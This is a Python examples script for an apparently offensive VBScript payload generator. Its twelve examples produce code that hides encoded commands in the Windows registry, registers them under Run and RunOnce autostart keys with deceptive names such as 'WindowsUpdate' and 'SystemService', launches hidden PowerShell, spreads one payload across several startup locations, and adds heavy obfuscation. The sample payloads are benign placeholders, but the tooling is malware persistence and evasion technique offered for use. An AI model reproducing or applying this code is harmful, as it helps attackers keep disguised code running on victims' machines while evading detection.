#!/usr/bin/env python3
"""
Registry Storage Examples
Demonstrates various ways to use registry storage functionality
"""

from vbs_encoder import (
    VBSEncoder, ObfuscationConfig,
    write_payload_to_registry, create_registry_retriever,
    validate_registry_path, validate_registry_hive
)


def example_1_simple_hkcu_storage():
    """Example 1: Simple storage in HKCU"""
    print("=" * 70)
    print("EXAMPLE 1: Simple HKCU Storage")
    print("=" * 70)

    vbs_code = write_payload_to_registry(
        payload="cmd.exe /c echo HelloWorld",
        registry_hive="HKCU",
        registry_path="Software\\TestApp",
        value_name="ConfigData",
        encoding="base64"
    )

    print(vbs_code)
    print("\n")


def example_2_hklm_storage_with_persistence():
    """Example 2: HKLM storage with startup persistence"""
    print("=" * 70)
    print("EXAMPLE 2: HKLM Storage with Persistence (Admin Required)")
    print("=" * 70)

    vbs_code = write_payload_to_registry(
        payload="powershell.exe -NoProfile -Command 'Write-Host Persistent'",
        registry_hive="HKLM",
        registry_path="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        value_name="SystemService",
        encoding="base64"
    )

    print(vbs_code)
    print("\n")


def example_3_hex_encoding_obfuscation():
    """Example 3: Hex encoding for better obfuscation"""
    print("=" * 70)
    print("EXAMPLE 3: Hex Encoding for Obfuscation")
    print("=" * 70)

    encoder = VBSEncoder()
    vbs_code = encoder.create_registry_storage_vbs(
        payload="C:\\Windows\\System32\\calc.exe",
        registry_hive="HKCU",
        registry_path="Software\\Microsoft\\Windows\\CurrentVersion",
        value_name="HexEncodedValue",
        encoding="hex"
    )

    print(vbs_code)
    print("\n")


def example_4_storage_and_retrieval():
    """Example 4: Combined storage and retrieval with auto-execution"""
    print("=" * 70)
    print("EXAMPLE 4: Storage and Retrieval with Auto-Execution")
    print("=" * 70)

    payload = "powershell.exe -Command \"[System.Windows.Forms.MessageBox]::Show('Test')\""

    vbs_code = write_payload_to_registry(
        payload=payload,
        registry_hive="HKCU",
        registry_path="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        value_name="ApplicationLauncher",
        encoding="base64",
        retrieve_and_execute=True
    )

    print(vbs_code)
    print("\n")


def example_5_retrieval_only():
    """Example 5: Retrieval only (read without execution)"""
    print("=" * 70)
    print("EXAMPLE 5: Retrieval Only (No Auto-Execution)")
    print("=" * 70)

    vbs_code = create_registry_retriever(
        registry_hive="HKCU",
        registry_path="Software\\MyApp\\Config",
        value_name="StoredCommand",
        encoding="base64",
        auto_execute=False
    )

    print(vbs_code)
    print("\n")


def example_6_complex_persistence_scenario():
    """Example 6: Complex multi-stage persistence"""
    print("=" * 70)
    print("EXAMPLE 6: Complex Multi-Stage Persistence Scenario")
    print("=" * 70)

    encoder = VBSEncoder()

    # Stage 1: Initial payload that stores itself
    initial_payload = (
        "powershell.exe -NoProfile -WindowStyle Hidden "
        "-Command \"Start-Process 'C:\\Windows\\System32\\cmd.exe' "
        "-ArgumentList '/c powershell.exe -Command \\\"Get-Process\\\"'\""
    )

    vbs_code = encoder.create_registry_persistence_payload(
        payload=initial_payload,
        registry_hive="HKCU",
        registry_path="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        value_name="WindowsUpdate",
        encoding="base64"
    )

    print(vbs_code)
    print("\n")


def example_7_multiple_registry_locations():
    """Example 7: Storing same payload in multiple registry locations"""
    print("=" * 70)
    print("EXAMPLE 7: Multiple Registry Location Storage")
    print("=" * 70)

    payload = "cmd.exe /c net user"

    locations = [
        ("HKCU", "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Service1"),
        ("HKCU", "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "Service2"),
        ("HKCU", "Software\\Microsoft\\Internet Explorer\\Desktop\\Components", "Service3"),
    ]

    for hive, path, value_name in locations:
        print(f"\nStoring in {hive}\\{path}\\{value_name}:")
        print("-" * 70)

        vbs_code = write_payload_to_registry(
            payload=payload,
            registry_hive=hive,
            registry_path=path,
            value_name=value_name,
            encoding="base64"
        )

        print(vbs_code[:500] + "...\n")  # Show first 500 chars


def example_8_validation():
    """Example 8: Registry path and hive validation"""
    print("=" * 70)
    print("EXAMPLE 8: Registry Validation")
    print("=" * 70)

    test_cases = [
        # (path, hive)
        ("Software\\Microsoft\\Windows", "HKCU"),
        ("Software/Microsoft/Windows", "HKCU"),  # Invalid - forward slash
        ("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "HKLM"),
        ("", "HKCU"),  # Invalid - empty path
        ("Valid\\Path", "HKEY_CURRENT_USER"),  # Valid - full hive name
        ("Valid\\Path", "INVALID_HIVE"),  # Invalid - wrong hive
    ]

    print("\nValidation Results:")
    print("-" * 70)

    for path, hive in test_cases:
        path_valid = validate_registry_path(path)
        hive_valid = validate_registry_hive(hive)
        overall = path_valid and hive_valid

        print(f"Path: '{path}'")
        print(f"  Path Valid: {path_valid}, Hive Valid: {hive_valid}, Overall: {overall}")


def example_9_long_payload_handling():
    """Example 9: Handling long payloads"""
    print("=" * 70)
    print("EXAMPLE 9: Long Payload Handling")
    print("=" * 70)

    # Create a long command
    long_payload = (
        "powershell.exe -NoProfile -Command \""
        "for ($i=0; $i -lt 100; $i++) { "
        "[System.Diagnostics.Process]::Start('notepad.exe'); "
        "Start-Sleep -Milliseconds 100; "
        "} "
        "\""
    )

    print(f"Payload length: {len(long_payload)} characters\n")

    vbs_code = write_payload_to_registry(
        payload=long_payload,
        registry_hive="HKCU",
        registry_path="Software\\LongPayloads",
        value_name="ComplexCommand",
        encoding="base64"
    )

    print(f"Generated VBS length: {len(vbs_code)} characters")
    print(f"First 500 characters:\n{vbs_code[:500]}...\n")


def example_10_combined_obfuscation():
    """Example 10: Combining registry storage with full obfuscation"""
    print("=" * 70)
    print("EXAMPLE 10: Combined Registry Storage + Full Obfuscation")
    print("=" * 70)

    from vbs_encoder import generate_clean_vbs_payload

    # Generate heavily obfuscated payload
    obfuscated_command = generate_clean_vbs_payload(
        "calc.exe",
        obfuscation_level="high"
    )

    # Store the obfuscated payload in registry
    vbs_code = write_payload_to_registry(
        payload=obfuscated_command,
        registry_hive="HKCU",
        registry_path="Software\\Microsoft\\Windows",
        value_name="ObfuscatedPayload",
        encoding="base64",
        retrieve_and_execute=False
    )

    print("Obfuscated payload stored in registry")
    print(f"Storage code length: {len(vbs_code)} characters\n")
    print("First 400 characters of storage code:")
    print(vbs_code[:400] + "...\n")


def example_11_error_handling_demo():
    """Example 11: Demonstrating error handling in registry operations"""
    print("=" * 70)
    print("EXAMPLE 11: Error Handling in Registry Operations")
    print("=" * 70)

    encoder = VBSEncoder()

    # Storage with error handling
    vbs_code = encoder.create_registry_storage_vbs(
        payload="test_command",
        registry_hive="HKLM",  # May fail if no admin
        registry_path="Software\\Test",
        value_name="TestValue",
        encoding="base64"
    )

    print("Generated storage code includes:")
    if "On Error Resume Next" in vbs_code:
        print("✓ Error suppression for write operation")
    if "On Error GoTo 0" in vbs_code:
        print("✓ Error handling reset after operation")

    print("\nGenerated retrieval code includes:")
    retrieval = encoder.create_registry_retrieval_and_execute_vbs()
    if "On Error Resume Next" in retrieval:
        print("✓ Error suppression for read operation")
    if "If Len(" in retrieval:
        print("✓ Validation that payload was retrieved successfully")


def example_12_registry_type_handling():
    """Example 12: Registry value type handling"""
    print("=" * 70)
    print("EXAMPLE 12: Registry Value Type Handling")
    print("=" * 70)

    encoder = VBSEncoder()

    vbs_code = encoder.create_registry_storage_vbs(
        payload="test_value",
        registry_hive="HKCU",
        registry_path="Software\\Test",
        value_name="TestKey",
        encoding="base64"
    )

    print("Registry value type handling:")
    print("-" * 70)

    if "REG_SZ" in vbs_code:
        print("✓ Using REG_SZ type for string storage")
        print("  (Supports up to 32,767 characters)")
    if ".RegWrite" in vbs_code:
        print("✓ Using RegWrite for creating/updating registry values")
    if ".RegRead" in encoder.create_registry_retrieval_and_execute_vbs():
        print("✓ Using RegRead for retrieving registry values")

    print("\nNote: REG_SZ is sufficient for most payloads")


def main():
    """Run all examples"""
    examples = [
        example_1_simple_hkcu_storage,
        example_2_hklm_storage_with_persistence,
        example_3_hex_encoding_obfuscation,
        example_4_storage_and_retrieval,
        example_5_retrieval_only,
        example_6_complex_persistence_scenario,
        example_7_multiple_registry_locations,
        example_8_validation,
        example_9_long_payload_handling,
        example_10_combined_obfuscation,
        example_11_error_handling_demo,
        example_12_registry_type_handling,
    ]

    for example in examples:
        try:
            example()
        except Exception as e:
            print(f"Error in {example.__name__}: {e}\n")


if __name__ == "__main__":
    main()
